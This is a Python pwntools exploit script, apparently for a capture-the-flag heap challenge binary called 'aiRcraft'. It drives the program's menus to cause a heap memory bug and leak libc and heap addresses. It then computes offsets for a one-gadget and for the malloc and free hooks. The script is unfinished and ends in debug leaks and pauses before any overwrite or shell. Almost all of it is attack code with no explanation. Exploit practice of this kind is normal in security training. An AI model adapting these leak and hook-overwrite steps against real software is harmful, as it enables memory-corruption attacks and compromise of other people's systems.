from pwn import *
context(arch='amd64', os='linux')

def fn_buy(idx, name):
	p.sendline("1")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

	# len(max_name) == 0x20
	p.sendline(name)
	print p.recv()

def fn_build(n, name):
	p.sendline("2")
	print p.recv()

	p.sendline(str(n))
	print p.recv()

	if len(name) == n:
		p.send(name)
	else:
		p.sendline(name)
	print p.recv()

def fn_enter_airport(idx, n_menu, ret=False):
	p.sendline("3")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

	# 1 : list all
	# 2 : sell the airport
	p.sendline(str(n_menu))
	data = p.recv().split("\x0a")
	print data

	if n_menu == 1:
		p.sendline("3")

	if ret: return data

def fn_select_plane(name, n_menu, n_airport=0):
	p.sendline("4")
	print p.recv()

	p.sendline(name)
	print p.recv()

	p.sendline(str(n_menu))

	if n_menu == 1:
		print p.recv()
		
		p.sendline(str(n_airport))
		print p.recv()

		p.sendline("3")
		print p.recv()

def fn_leak(list_leak):

	for t in list_leak:
		print "*** {} : {} ***".format(hex(t["addr"]), t["title"])
		print hexdump(p.leak(t["addr"], t["size"]))

target = "./aiRcraft"
code_base = 0x555555554000
heap_base = 0x555555757000
arrAirport = 0x202080
pHeadPlane = 0x202020
list_leak = [
	{
		"title": "heap_base",
		"addr" : heap_base,
		"size" : 0x280
	},{
		"title": "arrAirport",
		"addr" : code_base + arrAirport,
		"size" : 0x40
	},{
		"title": "pHeadPlane",
		"addr" : code_base + pHeadPlane,
		"size" : 0x40
	}
]
p = process(target)
print p.recv()

fn_build(0x80, "A"*8)
fn_build(0x80, "B"*8)
fn_build(0x80, "C"*8)
#fn_leak(list_leak)
#raw_input('')

fn_enter_airport(0, 2)
fn_enter_airport(1, 2)
#fn_leak(list_leak)
#raw_input('')

fn_buy(14, "a")
fn_select_plane("a", 1, 2)
libc_base = fn_enter_airport(2, 1, True)
libc_base = u64(libc_base[1].split("by ")[1].ljust(8, "\x00")) - 0x3c4bf8
one_shot = libc_base + 0x4526a
__malloc_hook = libc_base + 0x3c4b10
__free_hook = libc_base + 0x3c67a8

log.info("libc base : {}".format(hex(libc_base)))

fn_buy(15, "b")
fn_select_plane("b", 1, 2)
addr_heap = fn_enter_airport(2, 1, True)
addr_heap = u64(addr_heap[4].split("by ")[1].ljust(8, "\x00"))
addr_heap = (addr_heap & 0xfffffffffffff000)

log.info("heap addr : {}".format(hex(addr_heap)))

fn_select_plane("a", 2)
fn_select_plane("b", 2)
fn_leak(list_leak)
raw_input('')
fn_enter_airport(2, 2)
raw_input('')

fn_buy(0, "D")



fn_leak(list_leak)





